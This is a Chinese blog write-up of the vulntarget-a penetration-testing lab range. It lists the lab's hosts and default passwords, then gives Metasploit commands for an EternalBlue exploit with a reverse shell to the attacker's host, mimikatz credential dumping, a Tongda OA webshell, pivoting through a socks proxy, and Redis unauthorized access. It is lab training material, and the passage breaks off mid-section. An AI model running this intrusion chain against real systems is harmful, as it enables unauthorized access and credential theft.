---
title: vulntarget靶场系列-a-writeup - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/16979674.html
source: 博客园 - 渗透测试中心
date: 2022-12-14
fetch_date: 2025-10-04T01:24:25.360894
---

# vulntarget靶场系列-a-writeup - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [vulntarget靶场系列-a-writeup](https://www.cnblogs.com/backlion/p/16979674.html "发布于 2022-12-13 19:18")

## 网络配置

外网WIN7：

ip1: 192.168.127.91/255.255.255.0 ,gw:192.168.127.2 （NAT模式）

ip2:10.0.20.98-vmnet1(仅主机模式)

域主机成员：

10.0.20.99-vmnet1(仅主机模式)

10.0.10.111-vmnet2(仅主机模式)

域控：

10.0.10.110-vmnet2(仅主机模式)

密码配置：

Win7：win7/admin

win2016：Administrator/Admin@123、vulntarget.com\win2016   Admin#123

win2019：vulntarget.com\administrator   Admin@666

## 信息收集

**扫描主机**

arp-scan  -l

扫描同一网段中的存活主机

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191711513-1626284435.png)

发现一个存活主机:192.168.127.91

**扫描端口**

扫描一下存活靶机的ip地址

nmap -sC -T4 192.168.127.91

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191712192-145196284.png)

发现目标系统为win7,且开放了445端口，尝试利用永恒之蓝(ms17-010)打一波目标系统

## 内网主机渗透

在[kali](https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020)中输入命令：

msfconsole

msf 6> search 17-010

msf 6> use 0

msf 6> set payload windows/x64/meterpreter/reverse\_tcp

msf 6> set lport 6666

msf 6> set lhost 192.168.127.129

msf 6> set rhosts  192.168.127.91

msf 6> run

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191712956-1029759909.png)

meterpreter>shell

C:\Windows\System32>ipconfig

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191713593-1283889188.png)

发现有些乱码，直接在设置一下

C:\Windows\System32>CHCP 65001     #65001 UTF-8代码页

C:\Windows\System32>ipconfig  #发现有两个网段，一个是192.168.127的网段，另一个就是10.0.20网段

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191714161-1094728529.png)

C:\Windows\System32>whomai  #查看当前用户得权限为system权限

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191714702-252348703.png)

C:\Windows\System32>tasklist/svc  #查看进程，发现系统中没有杀软

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191715346-1589597284.png)

C:\Windows\System32>exit #退出shell命令终端

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191715906-298369840.png)

meterpreter>load kiwi  #加载mimikataz模块

meterpreter>creds\_all  #获取当前所有用户得登录凭证，发现用户名为win7，密码为：admin

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191716474-911388489.png)

##

## Web渗透

直接访问,http://192.168.127.91/,发现是通达OA

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191717226-1654624579.jpg)

查看通达OA的版本号，当前版本为11.3

<http://192.168.127.91/inc/expired.php>

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191717943-640772642.png)

通过搜索引擎搜索通达11.3存在文件包含漏洞

参考地址：https://blog.csdn.net/hackzkaq/article/details/115900500

这里使用一键图形化工具获得webshell

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191718577-2099848132.png)

使用蚁剑连接成功

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191719216-2051261566.png)

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191719873-1907814987.png)

同样在蚁剑的命令终端下查看当前用户的权限为system权限

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191720452-937084830.png)

## 横向渗透

进程迁移

获得shell时，该shell是极其脆弱，所以需要移动这个shell把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作，这样使渗透更难被检测到。自动迁移进程命令（run post/windows/manage/migrate）后，系统会自动寻找合适的进程然后迁移

meterpreter > run post/windows/manage/migrate   #从1080的spoolsv.exe迁移到了noepad.exe的4800进程

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191721109-1484099161.png)

查看本地网络连接子网段

meterpreter > run  get\_local\_subnets

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191721606-1086021725.png)

添加一条动态路由

meterpreter > run autoroute -s 10.0.20.0/24

或者

meterpreter >background

meterpreter >sessions

msf6 exploit(windows/smb/ms17\_010\_eternalblue) >use post/multi/manage/autoroute

msf6 exploit(windows/smb/ms17\_010\_eternalblue) >set session 1

msf6 exploit(windows/smb/ms17\_010\_eternalblue) >run

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191722153-1006008758.png)

meterpreter >background

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191722667-1892001697.png)

**发现存活主机**

msf6 exploit(windows/smb/ms17\_010\_eternalblue) >use post/windows/gather/arp\_scanner

msf6 exploit(windows/smb/ms17\_010\_eternalblue) >set session 1

msf6 exploit(windows/smb/ms17\_010\_eternalblue) >set rhosts 10.0.20.1-254

msf6 exploit(windows/smb/ms17\_010\_eternalblue) >run

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191723297-1260029520.png)

发现了另一台存活主机10.0.20.99

**开启socks5代理**

msf6 exploit(windows/smb/ms17\_010\_eternalblue) > use auxiliary/server/socks\_proxy

msf6 auxiliary(server/socks\_proxy) > run

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191723930-1794879283.png)

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191724427-2109448838.png)

**端口扫描**

首先先要需要修改/etc/proxychain4.conf配置文件

vim   /etc/proxychains4.conf

socks5  127.0.0.1  1080

通过nmap扫描目标IP的常用端口

proxychains nmap -sT -Pn 10.0.20.99 -p22,23,80,139,445,1433,3306,3389,6379,8080

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191725085-1001411680.png)

发现10.0.20.99主机开放了6379和80端口

这里使用本地socks5代理客服端proxifier软件

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191725785-1588524664.png)

通过dirsearch进行扫描，发现目标存在phpinfo.php敏感信息页面

python3   dirsearch.py  -l url.txt  -t 10  -e \*   -i 200,302  --format csv -o C:\Users\backlion\Desktop\dirsearch-master\xxx.com.csv

或者攻击机kali下执行

```
proxychains python dirsearch.py -u http://10.0.20.99 -i 200
```

```
proxychains dirsearch -u “http://10.0.20.99” --proxy=socks5://127.0.0.1:1080 -t 5
```

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191726385-1294028240.png)

访问phpinfo.php页面发现暴露了网站的绝对路径：C:/phpStudy/PHPTutorial/WWW/

<http://10.0.20.99/phpinfo.php>

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191727081-1201665938.png)

http://10.0.20.99/l.php

![](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221213191727770-861141790.png)

## Redis未授权访问

通过 redis-cli 命令可无密码进行远程连接

proxychains redis-cli -h 10.0.20.99

![](https://img2023.cnblogs.com/blog/1049983/202212/104...